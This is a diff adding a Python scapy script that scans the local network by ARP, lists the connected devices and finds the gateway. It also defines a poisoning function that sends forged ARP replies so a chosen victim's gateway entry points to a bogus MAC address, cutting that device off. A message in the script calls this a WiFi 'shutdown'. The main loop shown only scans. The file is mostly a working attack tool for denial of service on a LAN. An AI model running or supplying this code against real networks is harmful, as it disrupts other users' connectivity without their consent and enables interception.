@@ -1,0 +1,67 @@
+#!/usr/bin/env python
+
+import time
+import os
+from scapy.all import *
+
+# Get IP-MAC pairs of devices on the network
+def get_ip_macs(ips):
+    answers, _ = arping(ips, verbose=0)
+    res = []
+    for answer in answers:
+        mac = answer[1].hwsrc
+        ip = answer[1].psrc
+        res.append((ip, mac))
+    return res
+
+# Poison the victim's ARP cache
+def poison(victim_ip, victim_mac, gateway_ip):
+    packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
+    send(packet, verbose=0)
+
+# Restore the ARP cache
+def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
+    packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
+    send(packet, verbose=0)
+
+# Get the current LAN IP address
+def get_lan_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("google.com", 80))
+    ip = s.getsockname()[0]
+    s.close()
+    return ip
+
+# Check for root privileges
+if os.geteuid() != 0:
+    print("You need to run the script as a superuser")
+    exit()
+
+# Refresh and list connected devices
+refreshing = True
+gateway_mac = '12:34:56:78:9A:BC'  # Default (bad) gateway MAC address
+while refreshing:
+    myip = get_lan_ip()
+    ip_list = myip.split('.')
+    del ip_list[-1]
+    ip_list.append('*')
+    ip_range = '.'.join(ip_list)
+    del ip_list[-1]
+    ip_list.append('1')
+    gateway_ip = '.'.join(ip_list)
+
+    devices = get_ip_macs(ip_range)
+    print("Connected IPs:")
+    for i, device in enumerate(devices):
+        print(f"{i})\t{device[0]}\t{device[1]}")
+        if device[0] == gateway_ip:
+            gateway_mac = device[1]
+
+    print(f"Gateway IP: {gateway_ip}")
+    if gateway_mac != '12:34:56:78:9A:BC':
+        print(f"Gateway MAC: {gateway_mac}")
+    else:
+        print("Gateway not found. Script will be UNABLE TO RESTORE WIFI once shutdown is over")
+
+    choice = input("Do you want to continue refreshing? (yes/no): ")
+    refreshing = choice.lower() == "yes"
